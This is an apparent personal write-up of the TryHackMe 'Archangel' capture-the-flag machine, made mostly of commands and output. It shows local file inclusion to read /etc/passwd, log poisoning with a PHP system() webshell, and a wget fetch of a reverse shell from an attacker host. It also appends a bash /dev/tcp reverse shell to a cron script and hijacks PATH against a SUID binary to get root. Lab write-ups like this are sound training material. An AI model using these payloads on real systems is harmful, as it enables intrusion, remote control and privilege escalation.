---
title: Archangel
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Archangel
  machine on TryHackMe.
slug: archangel
---




```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPrwb4vLZ/CJqefgxZMUh3zsubjXMLrKYpP8Oy5jNSRaZynNICWMQNfcuLZ2GZbR84iEQJrNqCFcbsgD+4OPyy0TXV1biJExck3OlriDBn3g9trxh6qcHTBKoUMM3CnEJtuaZ1ZPmmebbRGyrG03jzIow+w2updsJ3C0nkUxdSQ7FaNxwYOZ5S3X5XdLw2RXu/o130fs6qmFYYTm2qii6Ilf5EkyffeYRc8SbPpZKoEpT7TQ08VYEICier9ND408kGERHinsVtBDkaCec3XmWXkFsOJUdW4BYVhrD3M8JBvL1kPmReOnx8Q7JX2JpGDenXNOjEBS3BIX2vjj17Qo3V
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKhhd/akQ2OLPa2ogtMy7V/GEqDyDz8IZZQ+266QEHke6vdC9papydu1wlbdtMVdOPx1S6zxA4CzyrcIwDQSiCg=
|   256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBE3FV9PrmRlGbT2XSUjGvDjlWoA/7nPoHjcCXLer12O
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

> look at mail option  and you find another domain now add  that to /etc/hosts now I can see that website is under development so I fuzz

```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 59]
/test.php             (Status: 200) [Size: 286]

```

> `http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php`

> `http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`

```
└─$ echo "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg== " | base64 -d
	
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>


base64: invalid input

```

```
GET /test.php?view=/var/www/html/development_testing/..//..//..//..//..//etc/passwd HTTP/1.1
```

```
	    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
	    root:x:0:0:root:/root:/bin/bash
	    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
	    bin:x:2:2:bin:/bin:/usr/sbin/nologin
	    sys:x:3:3:sys:/dev:/usr/sbin/nologin
	    sync:x:4:65534:sync:/bin:/bin/sync
	    games:x:5:60:games:/usr/games:/usr/sbin/nologin
	    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
	    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
	    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
	    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
	    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
	    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
	    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
	    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
	    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
	    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
	    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
	    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
	    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
	    syslog:x:102:106::/home/syslog:/usr/sbin/nologin
	    messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
	    _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
	    uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
	    sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
	    archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
	    </div>
	    </body>
```

> The users
> `root` `archangel`


```
test.php?view=/var/www/html/development_testing/..//..//..//..///var/log/apache2/access.log

```

```
 curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..///var/log/apache2/access.log

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        
192.168.153.193 - - [05/Dec/2025:18:20:50 +0530] "GET / HTTP/1.0" 200 19462 "-" "-"
192.168.153.193 - - [05/Dec/2025:18:20:51 +0530] "GET / HTTP/1.1" 200 19462 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.153.193 - - [05/Dec/2025:18:20:51 +0530] "PROPFIND / HTTP/1.1" 405 523 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.153.193 - - [05/Dec/2025:18:20:51 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.153.193 - - [05/Dec/2025:18:20:51 +0530] "PROPFIND / HTTP/1.1" 405 523 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html
```

> log poison into user agent `<?php system($_GET['cmd']); ?>` I use caido

```
Host: mafialive.thm
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: <?php system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

> upload revshell into target machine

```
test.php?view=/var/www/html/development_testing/..//..//..//..///var/log/apache2/access.log&wget http://attackerip:80/revshell.php

```

> in this situation have to encode url because cant keep space in url so add `%20`

```
&wget%20http://attackerip:80/revshell.php
```

> so now excute php file to get shell

```
GET /test.php?view=/var/www/html/development_testing//..//..//..//log/apache2/access.log&cmd=php%20php-reverse-shell.php HTTP/1.1
Host: mafialive.thm
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: <?php system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

```


```
nc -lnvp 9001
listening on [any] 9001 ...
connect to [192.168.153.193] from (UNKNOWN) [10.66.188.232] 44962
Linux ubuntu 4.15.0-123-generic #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 20:36:37 up  2:20,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/$ export TERM=xterm
export TERM=xterm
www-data@ubuntu:/$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                                                                       
┌──(kali㉿kali)-[~/git/php-reverse-shell]
└─$ stty raw -echo; fg
stty rows 38 columns 116
[1]  + continued  nc -lnvp 9001

www-data@ubuntu:/$ 
www-data@ubuntu:/$ 

```

```
www-data@ubuntu:/$ cd /home
www-data@ubuntu:/home$ ls
archangel
www-data@ubuntu:/home$ cd archangel
www-data@ubuntu:/home/archangel$ ls
myfiles  secret  user.txt
www-data@ubuntu:/home/archangel$ cat user.txt

```

```
www-data@ubuntu:/home/archangel$ cat /etc/crontab

# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

```

```
www-data@ubuntu:/$ cd /opt
cd /opt
www-data@ubuntu:/opt$ ls
ls
backupfiles  helloworld.sh
www-data@ubuntu:/opt$ cat helloworld.sh
cat helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
www-data@ubuntu:/opt$ echo "bash -i >& /dev/tcp/192.168.153.193/9002 0>&1" >> helloworld.sh
lloworld.sh-i >& /dev/tcp/attacker-ip/9002 0>&1" >> hel

```

> wait a min

```
nc -lnvp 9002
listening on [any] 9002 ...
connect to [192.168.153.193] from (UNKNOWN) [10.65.140.204] 59824
bash: cannot set terminal process group (992): Inappropriate ioctl for device
bash: no job control in this shell
archangel@ubuntu:~$ ls
ls
myfiles
secret
user.txt
archangel@ubuntu:~$ cd secret
cd secret
archangel@ubuntu:~/secret$ ls
ls
backup
user2.txt

```

```
archangel@ubuntu:~/secret$ ls
ls
backup  user2.txt
archangel@ubuntu:~/secret$ strings backup
strings backup
/lib64/ld-linux-x86-64.so.2
setuid
system
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
cp /home/user/archangel/myfiles/* /opt/backupfiles
:*3$"
GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o
__a
```

> `cp /home/user/archangel/myfiles/* /opt/backupfiles`

```
archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
sr/local/bin:/sbin:/bin:/usr/sbin:/usr/bincal/sbin:/us
archangel@ubuntu:~/secret$  /bin/chmod +x /home/archangel/secret/cp
 /bin/chmod +x /home/archangel/secret/cp
archangel@ubuntu:~/secret$ echo "$PATH"
ls -la /home/archangel/secret
./backupecho "$PATH"
/home/archangel/secret:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
archangel@ubuntu:~/secret$ ls -la /home/archangel/secret
total 36
drwxrwx--- 2 archangel archangel  4096 Dec  6 00:00 .
drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
-rwxrwxr-x 1 archangel archangel    13 Dec  6 00:04 cp
-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt

```

```
archangel@ubuntu:~/secret$ backup
backup
root@ubuntu:~/secret# ls
ls
backup  cp  user2.txt
root@ubuntu:~/secret# cd /root
cd /root
root@ubuntu:/root# ls
ls
root.txt
root@ubuntu:/root# cat root.txt
cat root.txt

```